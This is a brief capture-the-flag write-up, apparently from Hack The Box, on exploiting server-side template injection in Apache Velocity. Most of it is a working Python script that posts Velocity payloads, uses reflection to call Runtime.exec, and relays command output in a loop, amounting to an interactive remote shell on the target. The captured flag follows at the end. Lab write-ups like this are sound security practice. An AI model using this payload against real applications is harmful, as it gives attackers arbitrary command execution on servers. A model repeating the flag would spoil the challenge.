---
created: 2024-07-16T23:56
updated: 2024-07-16T23:57
---

## Analysis

```java
org.apache.velocity.Template t = new org.apache.velocity.Template();
```

Apparently the server passes our input into the velocity template directly.

However a lot of the online payloads doesn't work.

This is the final payload.

```python
import requests
import re
while True:
    payload = f"""
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('{input("$ ")}'))
$ex.waitFor()
#set($out=$ex.getInputStream().readAllBytes())
#foreach($i in $out)$str.valueOf($chr.toChars($i))#end
"""
    print(re.search('<h2 class="fire">([\s\S]+)</h2>', requests.post("http://94.237.51.8:40899/", data={"text": payload}).text).group(1))

# HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_0e15f3d341a7529fb80ce21794b76383}
```
